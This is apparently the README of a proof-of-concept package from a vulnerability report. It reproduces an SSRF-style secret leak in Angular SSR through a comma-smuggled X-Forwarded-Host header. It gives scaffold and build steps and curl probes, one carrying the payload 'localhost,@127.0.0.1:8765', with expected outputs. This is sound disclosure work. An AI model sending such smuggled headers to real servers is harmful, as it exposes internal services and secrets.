# PoC files

Minimal edits to a default `ng new --ssr` scaffold that reproduce the `Headers.get()` contract-violation finding in `@angular/ssr` 21.2.8. The PoC uses `node:http.request` for the outbound call so that undici's credential rejection in `fetch()` does not block the chain.

## Files

- `app.ts` - replace `src/app/app.ts` in the scaffold
- `app.config.ts` - replace `src/app/app.config.ts` (no `HttpClient` required)
- `app.routes.server.ts` - replace `src/app/app.routes.server.ts`
- `server.ts` - replace `src/server.ts`
- `angular.json.patch` - diff to apply to `angular.json`
- `victim.mjs` - listener on `127.0.0.1:8765` returning a timestamped secret

## Scaffold and apply

```
export POC=/path/to/poc

cd /tmp
npx -y -p @angular/cli@21.2.8 ng new xfh-comma-leak \
  --ssr --routing=true --style=css --skip-git --skip-install
cd xfh-comma-leak
npm install

cp "$POC/app.ts"               src/app/app.ts
cp "$POC/app.config.ts"        src/app/app.config.ts
cp "$POC/app.routes.server.ts" src/app/app.routes.server.ts
cp "$POC/server.ts"            src/server.ts
patch angular.json < "$POC/angular.json.patch"
```

## Build and run

```
npx ng build
node dist/xfh-comma-leak/server/server.mjs &
node "$POC/victim.mjs" &
```

Verify both listen:

```
lsof -iTCP:5100 -iTCP:8765 -sTCP:LISTEN
```

## Reproduce

```
# A. Baseline. No X-Forwarded-Host.
curl -s http://127.0.0.1:5100/ -H 'Host: localhost:5100' \
  | grep -oE '<pre id="result">[^<]*'
# Expected: <pre id="result">no-xfh

# B. Exploit. Comma-smuggled hostname.
curl -s http://127.0.0.1:5100/ -H 'Host: localhost:5100' \
                               -H 'X-Forwarded-Host: localhost,@127.0.0.1:8765' \
  | grep -oE '<pre id="result">[^<]*'
# Expected: <pre id="result">STATUS=200|BODY=COMMA_LEAK_SECRET_<timestamp>

# C. Control. Off-allowlist plain hostname.
curl -s http://127.0.0.1:5100/ -H 'Host: localhost:5100' \
                               -H 'X-Forwarded-Host: evil.test'
# Expected: URL with hostname "evil.test" is not allowed.
```

After probe B, `victim.mjs` logs `[victim:8765] GET /probe`. The timestamp on that line matches the `COMMA_LEAK_SECRET_<timestamp>` in the rendered HTML.

See `../evidence/` for captured logs from a reference run and `../report/VRP_REPORT.md` for the full writeup.

## Cleanup

```
pkill -f 'dist/xfh-comma-leak/server/server.mjs'
pkill -f 'poc/victim.mjs'
```
